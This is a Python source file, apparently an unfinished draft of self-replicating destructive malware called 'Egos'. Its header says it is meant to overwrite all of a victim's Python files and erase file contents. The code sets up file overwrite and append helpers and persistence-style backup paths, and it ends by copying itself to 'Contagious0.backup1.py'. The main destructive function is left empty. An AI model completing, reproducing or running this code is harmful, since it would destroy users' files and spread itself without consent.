#________________________________________________[FILE INFO]

#This is a python file intended to overwrite all your existing python files...
#Can also use the function of Killer to cause more potential harm...
#Can erase all the contents of files, making it empty...
#Details:
#Created by : Blue Infinity : Recon
#Project Name : Egos
#Start Date : 1-12-2024
#Visvasrk and team

#________________________________________________[END INFO]

#Import all the necessary modules
import os
import sys
import json
from pathlib import Path
from json import JSONDecodeError
import time

#Define variables for code convey (functional if used with () )
crtfile = os.path.basename(__file__)
curdir = os.curdir
getcwd = os.getcwd
absolute = os.path.abspath
ls = os.listdir
remove = os.remove
mkdir = os.mkdir
makedirs = os.makedirs
walk = os.walk
join = os.path.join
exists = os.path.exists

#Define the time variables
local= time.localtime()
gmt = time.gmtime()
crtepoach = time.time()
crttime = time.ctime(crtepoach)

#Define the storage variables

#Persistence Variables
drivejson = 'system/requirements/jsons'
jsonbackup = 'backup.json'
drivepy = 'system/requirements/python'
pybackup = 'backup.py'
drivetxt = 'system/requirements/txt'
txtbackup = 'backup.txt'
drivelog = 'system/logfiles/log'
mainlog = 'main.log'

#Define the machine functions

#Define a function to output the current time:
def ParseTime(target):
	fdate = time.strftime('%d%b%Y', target)
	ftime = time.strftime('%I%M%S', target)
	return f'{fdate}{ftime}'

#Define a code to write log
def WriteLog(error):
	makedirs(drivelog, exist_ok = True)
	logname = f'log{ParseTime(local)}.txt'
	with open(absolute(join(drivelog, logname)), 'w') as log:
		pass
	logfile = absolute(join(drivelog, logname))
	UpdateCode(logfile, error)
#Define a function to ReadCode and Return the output of the code
def ReadCode(target, output = False):
	with open(target, 'r') as sourcecode:
		code = sourcecode.read()
		if output:
			print(f'Code is :\n{code}')
		else:
			return code

#Define a function to overwrite a file and write a new code
def WriteCode(target, code):
	with open(target, 'w') as newsource:
		newsource.write(code)

#Define a function to appen to the file a code without overwriting it
def UpdateCode(target, content):
	with open(target, 'r') as oldsource:
		oldconn = oldsource.read()
	with open(target, 'w') as newsource:
		newconn = f'{oldconn}\n{content}'
		newsource.write(newconn)

#Define a function to check and return true
def Check(filepath, target):
	if exists(join(filepath, target)):
		return True
	else:
		try:
			makedirs(absolute(filepath), exist_ok = True)
			with open(absolute(join(filepath, target)), 'w') as newfile:
				pass
			return True
		except  OSError as e:
			WriteLog(e)
			return False

#Define a function to Dump data to json
def DumpJson(filepath, target, content):
	if Check(absolute(filepath), target):
		fullpath = absolute(join(filepath, target))
		with open(fullpath, 'w') as file_to_dump:
			json.dump(content, file_to_dump)
			return True

#Define a funtion to Load data from json
def LoadJson(filepath, target, output = False, reload_content = ReadCode(absolute(crtfile))):
	if Check(absolute(filepath), target):
		fullpath = absolute(join(filepath, target))
		try:
			with open(fullpath, 'r') as file_to_load:
				content = json.load(file_to_load)
				if output:
					print(f'The JSON content of {fullpath} is : \n {content}')
				else:
					return content
		except JSONDecodeError as decode_error:
			WriteLog(decode_error)
			DumpJson(filepath, target, reload_content)
			with open(fullpath, 'r') as file_to_reload:
				content = json.load(file_to_reload)
				if output:
					print(f'The JSON content of {fullpath} is : \n {content}')
				else:
					return content

#Define the Alas Function:


#________________________________________________[FILE FUNTIONS]

#Test
#print(ParseTime(local))
#Check('/hello/dir', 'hello')
#print(LoadJson(absolute(curdir), 'demoman.json'))
#print(DumpJson(getcwd(), 'demoman.json', ReadCode(crtfile)))
#print(LoadJson(absolute(curdir), 'demoman.json'))
WriteCode('Contagious0.backup1.py', ReadCode(crtfile))



